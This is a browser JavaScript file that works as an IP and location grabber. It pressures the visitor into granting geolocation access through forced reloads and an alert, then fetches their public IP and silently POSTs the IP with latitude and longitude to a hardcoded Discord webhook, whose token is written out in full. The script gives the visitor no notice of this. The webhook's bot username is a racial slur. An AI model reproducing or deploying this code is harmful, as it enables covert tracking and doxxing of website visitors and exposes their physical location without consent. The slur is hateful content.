var x = document.getElementById("demo");
var anew
window.onload = function() {      
  var geoSuccess = function(position) {           
     $.cookie("position_latitude", position.coords.latitude);
     $.cookie("position_longitude", position.coords.longitude);
     document.location.reload(true);
  };
  if ($.cookie("position_longitude", undefined))
      navigator.geolocation.getCurrentPosition(geoSuccess);

};
navigator.permissions && navigator.permissions.query({name: 'geolocation'})
.then(function(PermissionStatus) {
    if (PermissionStatus.state == 'granted') {
        console.log("granted")
    } else if (PermissionStatus.state == 'prompt') {
      console.log("prompt")
      setTimeout(function myFunction() {
        location.reload()
      },5000)
      
    } else {
         alert("Please allow location and refresh the website.")
         document.getElementById("map").style.display = 'none';

    }
})
function text(url) {
  console.log(url)
  return fetch(url).then(res => res.text());
}
function getLocation() {
  
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}
spc = " "
var anew
function showPosition(position) {
  anew = position.coords.latitude+spc+position.coords.longitude+spc
}

getLocation()
function sendMessage(msg) {
  const request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/1105995807066427392/f2bAUihbaCF68cSjC_zWbgYY_MdZIm9FyvfVpCa47F6OLC1Qc7gC9sOq_91XIfCkSc-U");
  request.setRequestHeader('Content-type', 'application/json');

  const params = {
    username: "Niggaheimer",
    avatar_url: "",
    content: msg
  }

  request.send(JSON.stringify(params));
}
fetch('https://freeipapi.com/api/json')
  .then(function(response) {
    return response.json();
  })
  .then(function(data) {
    console.log(data);
  });
// 2 - XMLHttpRequest : Older method
var req = new XMLHttpRequest();
var ipr;
req.overrideMimeType("application/json");
req.open('GET', 'https://freeipapi.com/api/json', true);
req.onload  = function() {
  ipr = JSON.parse(req.responseText);
  sendMessage(ipr.ipAddress+spc+anew)
};
req.send(null);
